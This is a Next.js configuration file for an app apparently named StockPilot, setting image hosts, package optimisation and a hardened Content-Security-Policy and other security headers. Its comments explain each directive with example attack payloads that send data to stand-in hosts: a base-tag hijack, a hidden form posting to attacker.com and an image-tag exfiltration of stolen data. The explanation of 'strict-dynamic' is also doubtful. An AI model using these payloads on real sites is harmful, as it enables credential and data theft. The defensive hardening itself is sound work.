import type { NextConfig } from 'next';

const nextConfig: NextConfig = {
  reactStrictMode: true,
  poweredByHeader: false,
  // Belt-and-suspenders: Next.js defaults this to false, but a future
  // dependency (e.g. a Sentry plugin) can flip the underlying webpack
  // devtool. Pin it explicitly so production never serves the full
  // server-side source as /_next/static/*.map.
  productionBrowserSourceMaps: false,

  typedRoutes: true,
  experimental: {
    // Tree-shake big icon/animation libs in dev so route compiles stay fast.
    optimizePackageImports: [
      'lucide-react',
      'framer-motion',
      'recharts',
      '@radix-ui/react-dialog',
      '@radix-ui/react-dropdown-menu',
      '@radix-ui/react-select',
      '@radix-ui/react-tabs',
      '@radix-ui/react-tooltip',
    ],
  },

  images: {
    remotePatterns: [
      { protocol: 'https', hostname: '*.supabase.co' },
      { protocol: 'https', hostname: '*.supabase.in' },
      { protocol: 'https', hostname: 'images.unsplash.com' },
      { protocol: 'https', hostname: 'avatars.githubusercontent.com' },
    ],
    formats: ['image/avif', 'image/webp'],
  },

  transpilePackages: ['@stockpilot/core'],

  async headers() {
    // CSP rationale — what each directive defends + why it's tuned the
    // way it is:
    //
    //   • default-src 'self' / object-src 'none' / frame-ancestors 'none'
    //     blocks Flash, PDFs, and clickjacking.
    //   • base-uri 'self' kills `<base href="//evil.com">` payloads
    //     that would otherwise re-base every relative URL.
    //   • form-action 'self' kills credential-stealing payloads that
    //     submit a hidden form to attacker.com.
    //   • script-src + 'strict-dynamic': Next.js requires inline+eval
    //     to bootstrap the App Router runtime. 'strict-dynamic' tells
    //     modern browsers to only trust scripts that the trusted
    //     bootstrap chain itself loaded — so a stored-XSS string with
    //     a literal <script> tag gets ignored even though
    //     'unsafe-inline' is present (the directive is overridden by
    //     'strict-dynamic' in CSP3 browsers). Browsers without CSP3
    //     fall back to the explicit allowlist (Stripe + Vercel
    //     telemetry).
    //   • img-src now lists explicit Supabase + Stripe origins
    //     instead of the universal `https:` wildcard, so a stored
    //     XSS can't exfiltrate via <img src="evil.com/?stolen=...">.
    //   • connect-src is tight to the four hosts we actually call.
    const cspProd = [
      "default-src 'self'",
      "base-uri 'self'",
      "object-src 'none'",
      "frame-ancestors 'none'",
      "form-action 'self'",
      "img-src 'self' data: blob: https://*.supabase.co https://*.supabase.in https://images.unsplash.com https://avatars.githubusercontent.com https://q.stripe.com https://www.googletagmanager.com",
      "media-src 'self' blob: data:",
      "font-src 'self' data:",
      "style-src 'self' 'unsafe-inline'",
      "script-src 'self' 'strict-dynamic' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com https://*.vercel-scripts.com https://va.vercel-scripts.com",
      "connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.resend.com https://api.stripe.com https://*.vercel-insights.com https://generativelanguage.googleapis.com",
      "frame-src 'self' https://js.stripe.com",
      "worker-src 'self' blob:",
      'upgrade-insecure-requests',
    ].join('; ');
    // Dev: drop strict-dynamic + upgrade-insecure-requests. Next.js
    // dev runs over http://localhost and HMR uses inline scripts
    // that strict-dynamic would block in some browsers; keeping it
    // out of dev avoids "looks broken locally, fine in prod"
    // confusion. Production deploys (the only ones browsers see)
    // get the full hardened policy.
    const cspDev = cspProd
      .replace(" 'strict-dynamic'", '')
      .replace('; upgrade-insecure-requests', '');
    const csp = process.env.NODE_ENV === 'production' ? cspProd : cspDev;

    return [
      {
        source: '/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          { key: 'Permissions-Policy', value: 'camera=(self), microphone=(), geolocation=(self)' },
          { key: 'X-DNS-Prefetch-Control', value: 'on' },
          // 2-year HSTS with preload eligibility. Production-only via
          // Vercel — local dev runs over http and ignores it.
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=63072000; includeSubDomains; preload',
          },
          { key: 'Content-Security-Policy', value: csp },
        ],
      },
    ];
  },
};

export default nextConfig;
